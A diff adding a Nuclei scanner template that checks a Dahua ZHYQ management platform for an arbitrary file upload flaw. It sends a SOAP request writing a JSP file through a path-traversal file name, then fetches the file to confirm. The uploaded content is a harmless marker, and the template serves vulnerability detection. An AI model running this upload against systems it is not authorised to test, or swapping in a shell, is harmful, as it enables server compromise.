@@ -1,0 +1,55 @@
+id: dahua-zhyq-integrated-management-platform-poi-anyfile-upload
+info:
+  name: Dahua ZHYQ Integrated Management Platform POI Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template checks for the arbitrary file upload vulnerability in Dahua ZHYQ Integrated Management Platform.
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: upload-check
+    method: POST
+    path:
+      - "{{BaseURL}}/emap/webservice/gis/soap/poi"
+    headers: 
+      Content-Type: text/xml;charset=UTF-8
+    body: |-
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <res:uploadPicFile>
+        <!--type: string-->
+        <arg0>/../../{{t1}}.jsp</arg0>
+        <!--type: base64Binary-->
+        <arg1>{{t2}}</arg1>
+        </res:uploadPicFile>
+        </soapenv:Body>
+      </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<code>1</code>"
+
+  - id: file-access-check
+    method: GET
+    path:
+      - "{{BaseURL}}/upload/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t1}}"
